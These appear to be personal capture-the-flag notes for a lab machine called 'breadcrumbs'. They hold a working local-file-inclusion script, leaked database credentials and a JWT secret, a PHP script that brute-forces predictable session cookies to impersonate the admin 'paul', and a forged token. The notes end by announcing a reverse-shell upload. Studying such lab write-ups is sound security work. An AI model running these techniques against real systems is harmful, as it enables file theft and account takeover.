# LFI Script and Lazy crawler

```python
import requests, re, sys

def lfi(page):
    data = {'book': page,
            'method': 1}
    resp= requests.post('http://10.10.10.228/includes/bookController.php',
           data=data)
    try:
        return bytes(resp.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/')
    except:
        return resp.text

if __name__ == "__main__":
    page = lfi(sys.argv[1])
    if len(sys.argv) == 3:
        files = re.findall(r'([a-zA-Z0-9\-\/]*\.php)', page)
        for f in files:
            print(f)
    else:
        print(page)

```
* Crawler 3 arg useing 'a' (lazy code)
```bash
$ python3 lfi.py ../db.php a
/db.php
bookController.php
```

## Loking how for info in source code

* Get content  ***db.php***
```bash
$ python3 lfi.py ../db/db.php
<?php

$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
```

### Looking at the fileController php file to see who can upload files
* ***../portal/includes/fileController.php***
* secret_key: 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e
```bash
$ python3 lfi.py ..//portal/includes/fileController.php
/home/dix/htb/breadcrumbs/lfi.py:9: DeprecationWarning: invalid escape sequence '\/'
  return bytes(resp.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/')
<?php
$ret = "";
require "../vendor/autoload.php";
use \Firebase\JWT\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}
```

### Looking around the source code to examine how PHP Sessions are built, so we can impersonate Paul
```bash
$ python3 lfi.py ../portal/cookie.php
/home/dix/htb/breadcrumbs/lfi.py:9: DeprecationWarning: invalid escape sequence '\/'
  return bytes(resp.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/')
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

## Running makesession with all permutations so we can get Pauls login cookie
```php
<?php
function makesession($username, $seed){
    $max = strlen($username) - 1;
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}

echo makesession("paul",0);
echo "\r\n";
echo makesession("paul",1);
echo "\r\n";
echo makesession("paul",2);
echo "\r\n";
echo makesession("paul",3);
echo "\r\n";
?>
```


```bash
$ php user.php 
paula2a6a014d3bee04d7df8d5837d62e8c5
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paul47200b180ccd6835d25d034eeb6e6390
```

* input the sessions  was create on burp to try catch the paul session
![[Pasted image 20211221013653.png]]
***PHPSession: paul47200b180ccd6835d25d034eeb6e6390 ***

![[Pasted image 20211221013802.png]]


### Now have to change the token to paul user, the token is using is the user test
* Input data to paul, and input the secret key
![[Pasted image 20211221014542.png]]

JWT Encode : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
* Now the PHP-Session is paul and the token is paul

*** Time to trying upload a reverse Shell ***